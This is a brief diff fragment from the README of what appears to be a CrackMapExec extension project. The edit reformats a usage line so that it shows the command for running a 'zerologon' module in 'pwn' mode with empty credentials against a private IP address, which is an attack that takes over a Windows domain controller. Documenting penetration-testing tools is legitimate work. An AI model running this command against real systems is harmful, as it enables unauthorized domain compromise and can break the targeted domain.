@@ -18,7 +18,7 @@ CrackMapExec extension module/protocol support
   Merged in official branch now. :)
 
 - ### cme-zerologon-autopwn
-  CME 192.168.1.1 -u '' -p '' -M zerologon -o mode=pwn
+  `CME 192.168.1.1 -u '' -p '' -M zerologon -o mode=pwn`
 
 ### Usage (development version)
 
